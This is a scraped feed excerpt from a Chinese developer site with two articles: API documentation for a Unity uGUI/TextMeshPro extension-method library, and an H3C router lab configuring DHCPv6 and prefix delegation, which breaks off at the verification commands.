pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述（Overview）  </h2>
<p>UIExtensions 是一个专注于 <strong>Unity UI 组件（uGUI &amp; TextMeshPro）</strong> 的静态扩展方法集合，位于 PFGameFramework.Library 命名空间。</p>
<p>主要功能包括：</p>
<ul>
<li>InputField / TMP_InputField 输入合法性校验</li>
<li>文本内容快速设置（Text / TMP_Text）</li>
<li>Toggle 单选/多选状态判断 &amp; 答案比对</li>
<li>简单提示文本设置</li>
<li>TextAsset（.txt）逐行读取并解析为字典</li>
<li>CSV 文件读取（返回 List&lt;List&gt;）</li>
<li>带字体大小的文本设置</li>
</ul>
<p>适用于：</p>
<ul>
<li>表单输入验证</li>
<li>动态文本更新</li>
<li>选择题/单选多选逻辑判断</li>
<li>配置表/步骤说明读取</li>
<li>CSV 数据导入</li>
</ul>
<p><strong>依赖</strong>：</p>
<ul>
<li>UnityEngine.UI</li>
<li>TMPro（TextMeshPro）</li>
<li>System.IO（CSV 文件读取）</li>
</ul>
<hr/>
<h2 data-id="heading-1">方法一览（API Index）</h2>

























































































<table><thead><tr><th>方法名</th><th>扩展类型</th><th>返回类型</th><th>主要功能</th><th>典型用途</th></tr></thead><tbody><tr><td>CheckInputField</td><td>InputField</td><td>bool</td><td>校验输入框是否合法（非空、非特殊字符）</td><td>防止非法输入</td></tr><tr><td>CheckInputField</td><td>TMP_InputField</td><td>bool</td><td>同上，支持 TMP_InputField</td><td>TMP 表单验证</td></tr><tr><td>SetTextContent</td><td>TMP_Text</td><td>void</td><td>设置 TMP_Text 内容</td><td>快速更新 TMP 文本</td></tr><tr><td>SetText</td><td>Text</td><td>void</td><td>设置 uGUI Text 内容</td><td>快速更新普通文本</td></tr><tr><td>SetTextWithSize</td><td>Text</td><td>void</td><td>设置文本内容 + 字体大小</td><td>带样式的文本更新</td></tr><tr><td>IsSingleSelected</td><td>List</td><td>bool</td><td>判断是否<strong>正好</strong>选中一个 Toggle（单选）</td><td>单选题验证</td></tr><tr><td>IsMultipleSelected</td><td>List</td><td>bool</td><td>判断是否选中了多个 Toggle（多选）</td><td>多选题初步筛选</td></tr><tr><td>IsAnswerCorrectByNames</td><td>List, HashSet</td><td>bool</td><td>判断选中的 Toggle 名称集合与正确答案完全匹配</td><td>严格选择题答案比对</td></tr><tr><td>SetText (GameObject)</td><td>GameObject</td><td>void</td><td>设置子物体中的 Text 组件内容</td><td>提示/状态文本更新</td></tr><tr><td>ReadTxtByText</td><td>TextAsset</td><td>void</td><td>读取 TextAsset，按 Tab 分割解析为 int → string 字典</td><td>步骤/配置表读取</td></tr><tr><td>ReadCsv</td><td>static</td><td>List&lt;List&gt;</td><td>读取 CSV 文件，返回二维字符串列表</td><td>表格数据导入</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">方法详情</h2>
<h3 data-id="heading-3">输入校验</h3>
<h4 data-id="heading-4">CheckInputField</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 校验 InputField 是否合法（非空、非纯空白、非 , . -）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">CheckInputField</span>(<span class="hljs-params">InputField inputField</span>)

<span class="hljs-comment">/// &lt;summary&gt;</span>
<span class="hljs-comment">/// 校验 TMP_InputField 是否合法</span>
<span class="hljs-comment">/// &lt;/summary&gt;</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">CheckInputField</span>(<span class="hljs-params">TMP_InputField inputField</span>)
</span></code></pre>
<p><strong>典型用法</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">if</span> (!inputField.<span class="hljs-built_in">CheckInputField</span>())
{
    <span class="hljs-comment">// 显示错误提示</span>
    <span class="hljs-selector-tag">errorText</span><span class="hljs-selector-class">.SetText</span>(<span class="hljs-string">"请输入有效数字！"</span>);
}
</code></pre>
<p><strong>当前规则</strong>：排除 ,、.、- 作为单独输入（防止小数点或负号误判），可根据需求扩展。</p>
<hr/>
<h3 data-id="heading-5">文本设置</h3>
<h4 data-id="heading-6">SetTextContent / SetText</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 设置 TMP_Text 内容（简洁扩展）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetTextContent</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> TMP_Text text, <span class="hljs-built_in">string</span> content</span>)

<span class="hljs-comment">/// &lt;summary&gt;</span>
<span class="hljs-comment">/// 设置 uGUI Text 内容</span>
<span class="hljs-comment">/// &lt;/summary&gt;</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetText</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> Text text, <span class="hljs-built_in">string</span> str</span>)

<span class="hljs-comment">/// &lt;summary&gt;</span>
<span class="hljs-comment">/// 设置 GameObject 下子级 Text 内容</span>
<span class="hljs-comment">/// &lt;/summary&gt;</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetText</span>(<span class="hljs-params">GameObject go, <span class="hljs-built_in">string</span> txt</span>)
</span></code></pre>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-csharp" lang="csharp">scoreText.SetTextContent(<span class="hljs-string">$"得分：<span class="hljs-subst">{score}</span>"</span>);
hintObj.SetText(<span class="hljs-string">"操作成功！"</span>);
</code></pre>
<h4 data-id="heading-7">SetTextWithSize</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 设置 uGUI Text 内容并同时设置字体大小</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetTextWithSize</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> Text text, <span class="hljs-built_in">string</span> str, <span class="hljs-built_in">int</span> size</span>)
</span></code></pre>
<hr/>
<h3 data-id="heading-8">Toggle 相关判断</h3>
<h4 data-id="heading-9">IsSingleSelected</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 判断 Toggle 列表中是否**正好**只有一个被选中（严格单选）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">IsSingleSelected</span>(<span class="hljs-params">List&lt;Toggle&gt; toggles</span>)
</span></code></pre>
<h4 data-id="heading-10">IsMultipleSelected</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 判断 Toggle 列表中是否至少有两个被选中</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">IsMultipleSelected</span>(<span class="hljs-params">List&lt;Toggle&gt; toggles</span>)
</span></code></pre>
<h4 data-id="heading-11">IsAnswerCorrectByNames</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 判断选中的 Toggle 名称集合与正确答案名称集合是否完全相等（顺序无关）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">IsAnswerCorrectByNames</span>(<span class="hljs-params">List&lt;Toggle&gt; toggles, HashSet&lt;<span class="hljs-built_in">string</span>&gt; correctNames</span>)
</span></code></pre>
<p><strong>推荐做法</strong>：Toggle 的 name 字段设置为选项唯一标识（如 "A"、"B"、"正确答案1" 等）。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> correct = <span class="hljs-keyword">new</span> HashSet&lt;<span class="hljs-built_in">string</span>&gt; { <span class="hljs-string">"A"</span>, <span class="hljs-string">"C"</span> };
<span class="hljs-keyword">if</span> (toggles.IsAnswerCorrectByNames(correct))
{
    Debug.Log(<span class="hljs-string">"答案正确！"</span>);
}
</code></pre>
<hr/>
<h3 data-id="heading-12">文件读取</h3>
<h4 data-id="heading-13">ReadTxtByText（TextAsset → Dictionary）</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 从 TextAsset 读取 Tab 分隔文本，解析为 int → string 字典（跳过首行）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ReadTxtByText</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> TextAsset textAsset, Dictionary&lt;<span class="hljs-built_in">int</span>, <span class="hljs-built_in">string</span>&gt; dictionary</span>)
</span></code></pre>
<p><strong>文件格式示例</strong>（UTF-8）：</p>
<pre><code class="hljs">1	第一步：点击开始
2	第二步：观察变化
</code></pre>
<h4 data-id="heading-14">ReadCsv</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 读取本地 CSV 文件，返回 List<span class="hljs-doctag">&lt;List&lt;string&gt;</span>&gt;（二维列表）</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="file"&gt;</span>文件完整路径<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="rowsNum"&gt;</span>文件行数（用于防止末尾空行）<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="splitChar"&gt;</span>列分隔符（通常 ,）<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;List&lt;<span class="hljs-built_in">string</span>&gt;&gt; ReadCsv(<span class="hljs-built_in">string</span> file, <span class="hljs-built_in">int</span> rowsNum, <span class="hljs-built_in">char</span> splitChar = <span class="hljs-string">','</span>)
</code></pre>
<p><strong>返回格式</strong>：</p>
<ul>
<li>外层 List：每一行</li>
<li>内层 List：每行拆分后的单元格</li>
</ul>
<p><strong>注意</strong>：使用 File.ReadAllText，适用于本地文件（Editor 或 StreamingAssets 需先拷贝）。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[H3C IPv6动态分配地址配置实验（DHCPv6、前缀委派）]]></title>    <link>https://juejin.cn/post/7602931486597546019</link>    <guid>https://juejin.cn/post/7602931486597546019</guid>    <pubDate>2026-02-05T07:01:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602931486597546019" data-draft-id="7602916013877477391" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="H3C IPv6动态分配地址配置实验（DHCPv6、前缀委派）"/> <meta itemprop="keywords" content="网络协议"/> <meta itemprop="datePublished" content="2026-02-05T07:01:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不做菜鸟的网工"/> <meta itemprop="url" content="https://juejin.cn/user/3283597248432442"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            H3C IPv6动态分配地址配置实验（DHCPv6、前缀委派）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3283597248432442/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不做菜鸟的网工
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T07:01:15.000Z" title="Thu Feb 05 2026 07:01:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">DHCPv6配置</h2>
<p>文章所属IPv6地址均为模拟地址，配置环境为HCL模拟环境。</p>
<h3 data-id="heading-1">网络拓扑与角色</h3>
<ul>
<li><strong>R1</strong>：ISP边缘路由器（DHCPv6服务器）</li>
<li><strong>R2</strong>：CPE/客户端路由器（DHCPv6前缀委派客户端）</li>
<li><strong>PC1</strong>、<strong>PC2</strong>：IPv6终端 (测试获取ipv6地址)</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c18d0ce55bc486998b3ba8c44396edd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5YGa6I-c6bif55qE572R5bel:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879816&amp;x-signature=o%2FtFukjxX%2FDiwLsgCpIudXN3l9M%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">一、R1配置详解（ISP侧）</h3>
<h4 data-id="heading-3">1. 基础DHCPv6配置</h4>
<pre><code class="hljs language-bash" lang="bash">dhcp <span class="hljs-built_in">enable</span>  <span class="hljs-comment"># 全局启用DHCP服务</span>
ipv6 dhcp prefix-pool 1 prefix 2001::/64 assign-len 80
<span class="hljs-comment"># 创建前缀池"1"，从2001::/64分配，给客户端分配/80前缀</span>
</code></pre>
<h4 data-id="heading-4">2. DHCPv6地址池配置</h4>
<pre><code class="hljs language-bash" lang="bash">ipv6 dhcp pool 1
 network 2001::/64            <span class="hljs-comment"># 地址分配范围</span>
 dns-server 2001::1           <span class="hljs-comment"># DNS服务器</span>
 prefix-pool 1 preferred-lifetime 86400 valid-lifetime 259200  <span class="hljs-comment"># 前缀委派配置</span>
 static-bind prefix 2001:1234:1::/80 duid 000300011a79de090400  <span class="hljs-comment"># 静态绑定给R2</span>
</code></pre>
<h4 data-id="heading-5">3. R1下联接口配置</h4>
<pre><code class="hljs language-bash" lang="bash">interface GigabitEthernet0/0
 ipv6 address 2001::1/64                     <span class="hljs-comment"># 接口地址</span>
 ipv6 address FE80::187B:48FF:FE0D:105 link-local  <span class="hljs-comment"># 链路本地地址</span>
 ipv6 dhcp select server                    <span class="hljs-comment"># 启用DHCPv6服务器功能</span>
 ipv6 dhcp server allow-hint preference 255 rapid-commit  <span class="hljs-comment"># 允许客户端提示，优先级最高</span>
 ipv6 nd autoconfig managed-address-flag    <span class="hljs-comment"># 告知客户端使用DHCPv6获取地址</span>
 ipv6 nd autoconfig other-flag              <span class="hljs-comment"># 告知客户端使用DHCPv6获取其他配置</span>
 undo ipv6 nd ra halt                       <span class="hljs-comment"># 发送RA消息</span>
 ipv6 nd ra router-lifetime 1800            <span class="hljs-comment"># 路由器生存时间1800秒</span>
</code></pre>
<h4 data-id="heading-6">4. 回程路由配置</h4>
<p>去往前缀委派的网段需手动配置</p>
<pre><code class="hljs language-bash" lang="bash">ipv6 route-static 2001:1234:1:: 80 GigabitEthernet0/0 FE80::1879:DEFF:FE09:405
<span class="hljs-comment"># 指向R2获取的前缀，使用R2的链路本地地址作为下一跳</span>
</code></pre>
<h3 data-id="heading-7">二、R2配置详解（客户端侧）</h3>
<h4 data-id="heading-8">1. R2-WAN口配置</h4>
<pre><code class="hljs language-bash" lang="bash">interface GigabitEthernet0/0
 ipv6 address FE80::1879:DEFF:FE09:405 link-local
 ipv6 address auto link-local              <span class="hljs-comment"># 自动生成链路本地地址</span>
 ipv6 address dhcp-alloc                   <span class="hljs-comment"># 通过DHCPv6获取全球单播地址</span>
 ipv6 dhcp client pd 1                     <span class="hljs-comment"># 请求前缀委派（需事先开启DHCP）</span>
</code></pre>
<h4 data-id="heading-9">2. R2-LAN口配置</h4>
<pre><code class="hljs language-bash" lang="bash">interface GigabitEthernet0/1
 ipv6 address 2001:1234:1::1/80           <span class="hljs-comment"># 使用从R1获取的前缀</span>
 ipv6 dhcp select server                  <span class="hljs-comment"># 启用DHCPv6服务器</span>
 ipv6 dhcp server apply pool 1            <span class="hljs-comment"># 应用地址池</span>
 undo ipv6 nd ra halt
 ipv6 nd ra router-lifetime 1800          <span class="hljs-comment"># 通告自己为默认网关</span>
</code></pre>
<h4 data-id="heading-10">3. DHCPv6服务配置</h4>
<pre><code class="hljs language-bash" lang="bash">dhcp <span class="hljs-built_in">enable</span>
ipv6 dhcp pool 1
 network 2001:1234:1::/80  <span class="hljs-comment"># 使用委派的前缀分配地址</span>
 dns-server 2001:1234:1::1  <span class="hljs-comment"># DNS服务器（指向自己或ISP的DNS）</span>
</code></pre>
<h3 data-id="heading-11">三、工作原理流程</h3>
<h4 data-id="heading-12">1. 前缀委派过程</h4>
<pre><code class="hljs language-scss" lang="scss">R2 (客户端)                          R1 (服务器)
  |---<span class="hljs-attr">--Solicit</span> (请求PD)--------------&gt;|
  |&lt;---<span class="hljs-attr">--Advertise</span> (通告可用PD)--------|
  |---<span class="hljs-attr">--Request</span> (请求PD)--------------&gt;|
  |&lt;---<span class="hljs-attr">--Reply</span> (分配<span class="hljs-number">2001</span>:<span class="hljs-number">1234</span>:<span class="hljs-number">1</span>::/<span class="hljs-number">80</span>)--|
</code></pre>
<h4 data-id="heading-13">2. 地址分配过程</h4>
<pre><code class="hljs language-scss" lang="scss">下游设备                           R2 (DHCP服务器)
  |---<span class="hljs-attr">--Solicit----------------------</span>&gt;|
  |&lt;---<span class="hljs-attr">--Advertise--------------------</span>|
  |---<span class="hljs-attr">--Request----------------------</span>&gt;|
  |&lt;---<span class="hljs-attr">--Reply</span> (分配<span class="hljs-number">2001</span>:<span class="hljs-number">1234</span>:<span class="hljs-number">1</span>::/<span class="hljs-number">128</span>)|
</code></pre>
<h4 data-id="heading-14">3. 路由流程</h4>
<pre><code class="hljs language-javascript" lang="javascript">互联网 → <span class="hljs-variable constant_">R1</span> → <span class="hljs-number">2001</span>::<span class="hljs-regexp">/64网络 → R2 → 2001:1234:1::/</span><span class="hljs-number">80</span>网络 → 内部设备
内部设备 → <span class="hljs-variable constant_">R2</span> → <span class="hljs-variable constant_">R1</span> (通过默认路由) → 互联网
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d5753db890245b084372956654ee65c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5YGa6I-c6bif55qE572R5bel:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879816&amp;x-signature=U0WfZTus9sussni1GNSNonO4dew%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e877d621ef434ab88c22c863643054f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5YGa6I-c6bif55qE572R5bel:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879816&amp;x-signature=wrqW1OO8J6%2Fa5ZP3bZ%2BmBbeGty8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-15">四、关键技术点</h3>
<h4 data-id="heading-16">1. DHCPv6分配方式</h4>
<ul>
<li><strong>前缀委派 (PD)</strong>：为站点/路由器分配地址块（如/56, /60, /64）
<ul>
<li>用途：企业站点、家庭网络下级路由</li>
<li>示例：分配2001:1234:1::/80给R2，然后R2再往下游分配</li>
</ul>
</li>
<li><strong>地址分配 (IA_NA)</strong>：为终端分配单个IPv6地址（/128）
<ul>
<li>用途：PC、手机等终端设备</li>
<li>示例：分配2001::100/128给客户端</li>
</ul>
</li>
</ul>
<h4 data-id="heading-17">2. RA标志位含义</h4>
<pre><code class="hljs language-bash" lang="bash">ipv6 nd autoconfig managed-address-flag  <span class="hljs-comment"># M标志=1，使用DHCPv6获取地址</span>
ipv6 nd autoconfig other-flag           <span class="hljs-comment"># O标志=1，使用DHCPv6获取其他配置</span>
<span class="hljs-comment"># 组合意义：</span>
<span class="hljs-comment"># M=1,O=0: 仅地址通过DHCPv6获取</span>
<span class="hljs-comment"># M=0,O=1: SLAAC获取地址，其他配置通过DHCPv6</span>
<span class="hljs-comment"># M=1,O=1: 地址和其他配置都通过DHCPv6</span>
</code></pre>
<h4 data-id="heading-18">3. 静态前缀绑定</h4>
<pre><code class="hljs language-bash" lang="bash">static-bind prefix 2001:1234:1::/80 duid 000300011a79de090400
<span class="hljs-comment"># 基于DUID固定分配特定前缀给特定客户端</span>
<span class="hljs-comment"># DUID获取：在客户端执行 `display ipv6 dhcp duid`</span>
</code></pre>
<h4 data-id="heading-19">4. 链路本地地址路由</h4>
<pre><code class="hljs language-bash" lang="bash">ipv6 route-static 2001:1234:1:: 80 GigabitEthernet0/0 FE80::1879:DEFF:FE09:405
<span class="hljs-comment"># 使用链路本地地址作为下一跳</span>
<span class="hljs-comment"># 优势：不依赖全球单播地址变化，更稳定</span>
</code></pre>
<h3 data-id="heading-20">五、验证命令</h3>
<h4 data-id="heading-21">在R1上查看</h4>
<pre><code class="hljs language-bash" lang="bash">dis ipv6 dhcp server ip-in-use      <span class="hljs-comment"># 查看分配的IPv6地址</span>
